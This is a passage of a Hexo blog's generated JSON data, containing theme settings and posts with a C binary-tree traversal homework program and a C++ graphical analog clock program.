GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":2421,"excerpt":"<h1 id=\"二叉树的遍历\"><a href=\"#二叉树的遍历\" class=\"headerlink\" title=\"二叉树的遍历\"></a>二叉树的遍历</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br>","more":"<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 20</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> NodeSum=<span class=\"number\">0</span>,LeafNode=<span class=\"number\">0</span>,Rank=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BTNode</span>&#123;</span>       <span class=\"comment\">/*节点结构声明*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> data ;               <span class=\"comment\">/*节点数据*/</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BTNode</span> *<span class=\"title\">lchild</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BTNode</span> *<span class=\"title\">rchild</span> ;</span>  <span class=\"comment\">/*指针*/</span></span><br><span class=\"line\">&#125;*BiTree;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">createBiTree</span><span class=\"params\">(BiTree *t)</span></span>&#123; <span class=\"comment\">/* 先序遍历创建二叉树*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> s;</span><br><span class=\"line\">\tBiTree q;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\nplease input data:(exit for #)&quot;</span>);</span><br><span class=\"line\">\ts=getchar();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(s==<span class=\"string\">&#x27;#&#x27;</span>)&#123;*t=<span class=\"literal\">NULL</span>; <span class=\"keyword\">return</span>;&#125;</span><br><span class=\"line\">\tq=(BiTree)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(struct BTNode));</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(q==<span class=\"literal\">NULL</span>)&#123;<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Memory alloc failure!&quot;</span>); <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);&#125;</span><br><span class=\"line\">\tq-&gt;data=s;</span><br><span class=\"line\">\t*t=q;</span><br><span class=\"line\">\tcreateBiTree(&amp;q-&gt;lchild); <span class=\"comment\">/*递归建立左子树*/</span></span><br><span class=\"line\">\tcreateBiTree(&amp;q-&gt;rchild); <span class=\"comment\">/*递归建立右子树*/</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">PreOrder</span><span class=\"params\">(BiTree p)</span></span>&#123;  <span class=\"comment\">/* 先序遍历二叉树*/</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( p!= <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">       \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class=\"line\">\t\tNodeSum++;</span><br><span class=\"line\">       \tPreOrder( p-&gt;lchild ) ;</span><br><span class=\"line\">       \tPreOrder( p-&gt;rchild) ;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(p-&gt;lchild==<span class=\"literal\">NULL</span>&amp;&amp;p-&gt;rchild==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t\tLeafNode++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">GetRank</span><span class=\"params\">(BiTree p)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> LRank=GetRank(p-&gt;lchild);</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> RRank=GetRank(p-&gt;rchild);</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> max=LRank;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (max&lt;RRank)</span><br><span class=\"line\">\t\t\tmax=RRank;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> max + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">InOrder</span><span class=\"params\">(BiTree p)</span></span>&#123;  <span class=\"comment\">/* 中序遍历二叉树*/</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( p!= <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\"> \t InOrder( p-&gt;lchild ) ;</span><br><span class=\"line\">   \t <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class=\"line\">   \t InOrder( p-&gt;rchild) ;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">PostOrder</span><span class=\"params\">(BiTree p)</span></span>&#123;  <span class=\"comment\">/* 后序遍历二叉树*/</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> ( p!= <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    \tPostOrder( p-&gt;lchild ) ;</span><br><span class=\"line\">       \tPostOrder( p-&gt;rchild) ;</span><br><span class=\"line\">       \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, p-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Preorder_n</span><span class=\"params\">(BiTree p)</span></span>&#123; <span class=\"comment\">/*先序遍历的非递归算法*/</span></span><br><span class=\"line\">    BiTree <span class=\"built_in\">stack</span>[MAX],q;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> top=<span class=\"number\">0</span>,i;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;MAX;i++) <span class=\"built_in\">stack</span>[i]=<span class=\"literal\">NULL</span>;<span class=\"comment\">/*初始化栈*/</span></span><br><span class=\"line\">    q=p;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(q!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>,q-&gt;data);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(q-&gt;rchild!=<span class=\"literal\">NULL</span>) <span class=\"built_in\">stack</span>[top++]=q-&gt;rchild;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(q-&gt;lchild!=<span class=\"literal\">NULL</span>) q=q-&gt;lchild;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(top&gt;<span class=\"number\">0</span>) q=<span class=\"built_in\">stack</span>[--top];</span><br><span class=\"line\">            <span class=\"keyword\">else</span> q=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">release</span><span class=\"params\">(BiTree t)</span></span>&#123; <span class=\"comment\">/*释放二叉树空间*/</span></span><br><span class=\"line\">  \t<span class=\"keyword\">if</span>(t!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">    \trelease(t-&gt;lchild);</span><br><span class=\"line\">    \trelease(t-&gt;rchild);</span><br><span class=\"line\">    \t<span class=\"built_in\">free</span>(t);</span><br><span class=\"line\">  \t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    BiTree t=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    createBiTree(&amp;t);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n\\nPreOrder the tree is:&quot;</span>);</span><br><span class=\"line\">    PreOrder(t);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n\\nInOrder the tree is:&quot;</span>);</span><br><span class=\"line\">    InOrder(t);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n\\nPostOrder the tree is:&quot;</span>);</span><br><span class=\"line\">    PostOrder(t);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n\\nPreOrder(Not Recursive):&quot;</span>);</span><br><span class=\"line\">    Preorder_n(t);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\nThe Sum Of Node is %d\\n&quot;</span>,NodeSum);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The Sum Of LeafNode is %d\\n&quot;</span>,LeafNode);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The Height Of The Tree is %d\\n&quot;</span>,GetRank(t));</span><br><span class=\"line\">    release(t);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"Clock","date":"2020-04-08T08:08:24.000Z","abbrlink":"7fba9196","_content":"> C++编写的Clocl GUI\n\n```cpp\n#include <graphics.h>\n#include <cstdio>\n#include <math.h>\n#include <time.h>\nint posx = 240, posy = 240, R = 170;\nchar str[24];\nint point(int r, int rad, bool xy)//获取偏移点坐标\n{\n\tdouble x = posx, y = posy;\n\tif (xy)return (int)(y - r * cos(rad* PI / 180));\n\treturn (int)(x + r * sin(rad* PI / 180));\n}\nvoid loop()//更新\n{\n\tsetbkcolor(EGERGB(30, 30, 30));\n\tsetlinewidth(3); setcolor(EGERGB(64, 0, 128));\n\tcircle(posx, posy, R + 16); circle(posx, posy, R + 14); circle(posx, posy, R + 12); circle(posx, posy, R + 10);\n\tsetlinewidth(1); setcolor(EGERGB(128, 128, 128));\n\tfor (int i = 0; i < 60; i++)//刻度\n\t{\n\t\tif (i % 5)line(point(R + 2, i * 6, 0), point(R + 2, i * 6, 1), point(R + 9, i * 6, 0), point(R + 9, i * 6, 1));\n\t\telse line(point(R - 4, i * 6, 0), point(R - 4, i * 6, 1), point(R + 9, i * 6, 0), point(R + 9, i * 6, 1));\n\t}\n\tsetcolor(EGERGB(0xFF, 0xFF, 0xFF)); setfont(18, 0, \"宋体\");\n\tfor (int i = 1; i <= 12; i++)//读数\n\t{\n\t\tsprintf(str, \"%d\", i);\n\t\touttextrect(point(R - 8, i * 30, 0) - 5, point(R - 8, i * 30, 1) - 5, point(R - 8, i * 30, 0) + 5, point(R - 8, i * 30, 1) + 5, str);\n\t}\n\ttime_t t_now; time(&t_now); tm* t = localtime(&t_now);//获取系统时间\n\tsprintf(str, \"%04d/%02d/%02d %02d:%02d:%02d\", t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec);\n\tsetlinewidth(8); setcolor(BLUE);\n\tline(posx, posy, point(R - 80, t->tm_hour % 12 * 30, 0), point(R - 80, t->tm_hour % 12 * 30 + t->tm_min / 12, 1));//时针\n\tsetlinewidth(4); setcolor(RED);\n\tline(posx, posy, point(R - 40, t->tm_min * 6, 0), point(R - 40, t->tm_min * 6, 1));//分针\n\tsetlinewidth(2); setcolor(YELLOW);\n\tline(posx, posy, point(R - 10, t->tm_sec * 6, 0), point(R - 10, t->tm_sec * 6, 1));//秒针\n\tsetfillcolor(YELLOW); fillellipse(posx, posy, 5, 5);\n\tsetcolor(GREEN); setfont(30, 0, \"宋体\"); outtextxy(95, 500, str);//数字时钟\n}\nint main()\n{\n\tinitgraph(480, 640);//初始化画布\n\tfor (; !kbhit(); delay_fps(60))\n\t{\n\t\tcleardevice();//清除画布\n\t\tloop();//更新\n\t}\n\tclosegraph();//关闭画布\n\treturn 0;\n}\n```","source":"_posts/Clock.md","raw":"---\ntitle: Clock\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - C++\ntags: GUI\nabbrlink: 7fba9196\n---\n> C++编写的Clocl GUI\n\n```cpp\n#include <graphics.h>\n#include <cstdio>\n#include <math.h>\n#include <time.h>\nint posx = 240, posy = 240, R = 170;\nchar str[24];\nint point(int r, int rad, bool xy)//获取偏移点坐标\n{\n\tdouble x = posx, y = posy;\n\tif (xy)return (int)(y - r * cos(rad* PI / 180));\n\treturn (int)(x + r * sin(rad* PI / 180));\n}\nvoid loop()//更新\n{\n\tsetbkcolor(EGERGB(30, 30, 30));\n\tsetlinewidth(3); setcolor(EGERGB(64, 0, 128));\n\tcircle(posx, posy, R + 16); circle(posx, posy, R + 14); circle(posx, posy, R + 12); circle(posx, posy, R + 10);\n\tsetlinewidth(1); setcolor(EGERGB(128, 128, 128));\n\tfor (int i = 0; i < 60; i++)//刻度\n\t{\n\t\tif (i % 5)line(point(R + 2, i * 6, 0), point(R + 2, i * 6, 1), point(R + 9, i * 6, 0), point(R + 9, i * 6, 1));\n\t\telse line(point(R - 4, i * 6, 0), point(R - 4, i * 6, 1), point(R + 9, i * 6, 0), point(R + 9, i * 6, 1));\n\t}\n\tsetcolor(EGERGB(0xFF, 0xFF, 0xFF)); setfont(18, 0, \"宋体\");\n\tfor (int i = 1; i <= 12; i++)//读数\n\t{\n\t\tsprintf(str, \"%d\", i);\n\t\touttextrect(point(R - 8, i * 30, 0) - 5, point(R - 8, i * 30, 1) - 5, point(R - 8, i * 30, 0) + 5, point(R - 8, i * 30, 1) + 5, str);\n\t}\n\ttime_t t_now; time(&t_now); tm* t = localtime(&t_now);//获取系统时间\n\tsprintf(str, \"%04d/%02d/%02d %02d:%02d:%02d\", t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec);\n\tsetlinewidth(8); setcolor(BLUE);\n\tline(posx, posy, point(R - 80, t->tm_hour % 12 * 30, 0), point(R - 80, t->tm_hour % 12 * 30 + t->tm_min / 12, 1));//时针\n\tsetlinewidth(4); setcolor(RED);\n\tline(posx, posy, point(R - 40, t->tm_min * 6, 0), point(R - 40, t->tm_min * 6, 1));//分针\n\tsetlinewidth(2); setcolor(YELLOW);\n\tline(posx, posy, point(R - 10, t->tm_sec * 6, 0), point(R - 10, t->tm_sec * 6, 1));//秒针\n\tsetfillcolor(YELLOW); fillellipse(posx, posy, 5, 5);\n\tsetcolor(GREEN); setfont(30, 0, \"宋体\"); outtextxy(95, 500, str);//数字时钟\n}\nint main()\n{\n\tinitgraph(480, 640);//初始化画布\n\tfor (; !kbhit(); delay_fps(60))\n\t{\n\t\tcleardevice();//清除画布\n\t\tloop();//更新\n\t}\n\tclosegraph();//关闭画布\n\treturn 0;\n}\n```","slug":"Clock","published":1,"updated":"2020-05-11T09:33:15.040Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkac000bqse5382dg9s0","content":"<blockquote>\n<p>C++编写的Clocl GUI</p>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;graphics.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">int</span> posx = <span class=\"number\">240</span>, posy = <span class=\"number\">240</span>, R = <span class=\"number\">170</span>;</span><br><span class=\"line\"><span class=\"keyword\">char</span> str[<span class=\"number\">24</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">point</span><span class=\"params\">(<span class=\"keyword\">int</span> r, <span class=\"keyword\">int</span> rad, <span class=\"keyword\">bool</span> xy)</span><span class=\"comment\">//获取偏移点坐标</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> x = posx, y = posy;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (xy)<span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)(y - r * <span class=\"built_in\">cos</span>(rad* PI / <span class=\"number\">180</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)(x + r * <span class=\"built_in\">sin</span>(rad* PI / <span class=\"number\">180</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">loop</span><span class=\"params\">()</span><span class=\"comment\">//更新</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetbkcolor(EGERGB(<span class=\"number\">30</span>, <span class=\"number\">30</span>, <span class=\"number\">30</span>));</span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">3</span>); setcolor(EGERGB(<span class=\"number\">64</span>, <span class=\"number\">0</span>, <span class=\"number\">128</span>));</span><br><span class=\"line\">\tcircle(posx, posy, R + <span class=\"number\">16</span>); circle(posx, posy, R + <span class=\"number\">14</span>); circle(posx, posy, R + <span class=\"number\">12</span>); circle(posx, posy, R + <span class=\"number\">10</span>);</span><br><span class=\"line\">\tsetlinewidth(<span class=\"number\">1</span>); setcolor(EGERGB(<span class=\"number\">128</span>, <span class=\"number\">128</span>, <span class=\"number\">128</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">60</span>; i++)<span class=\"comment\">//刻度</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (i % <span class=\"number\">5</span>)line(point(R + <span class=\"number\">2</span>, i * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R + <span class=\"number\">2</span>, i * <span class=\"number\">6</span>, <span class=\"number\">1</span>), point(R + <span class=\"number\">9</span>, i * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R + <span class=\"number\">9</span>, i * <span class=\"number\">6</span>, <span class=\"number\">1</span>));</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> line(point(R - <span class=\"number\">4</span>, i * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R - <span class=\"number\">4</span>, i * <span class=\"number\">6</span>, <span class=\"number\">1</span>), point(R + <span class=\"number\">9</span>, i * <span class=\"number\">6</span>, <span class=\"number\">0</span>), point(R + <span class=\"number\">9</span>, i * <span class=\"number\">6</span>, <span class=\"number\">1</span>));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>, <span class=\"number\">0xFF</span>)); setfont(<span class=\"number\">18</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">12</span>; i++)<span class=\"comment\">//读数</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(str, <span class=\"string\">&quot;%d&quot;</span>, i);</span><br><span class=\"line\">\t\touttextrect(point(R - <span class=\"number\">8</span>, i * <span class=\"number\">30</span>, <span class=\"number\">0</span>) - <span class=\"number\">5</span>, point(R - <span class=\"number\">8</span>, i * <span class=\"number\">30</span>, <span class=\"number\">1</span>) - <span class=\"number\">5</span>, point(R - <span class=\"number\">8</span>, i * <span class=\"number\">30</span>, <span class=\"number\">0</span>) + <span class=\"number\">5</span>, point(R - <span class=\"number\">8</span>, i * <span class=\"number\">30</span>, <span class=\"number\">1</span>) + <span class=\"number\">5</span>, str);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">time_t</span> t_now; time(&amp;t_now); tm* t = localtime(&amp;t_now);<span class=\"comment\">//获取系统时间</span></span><br><span class=\"line\">\t<span class=\"built_in\">sprintf</span>(str, <span class=\"string\">&quot;%04d/%02d/%02d %02d:%02d:%02d&quot;</span>, t-&gt;tm_year + <span class=\"number\">1900</span>, t-&gt;tm_mon + <span class=\"number\">1</span>, t-&gt;tm_mday, 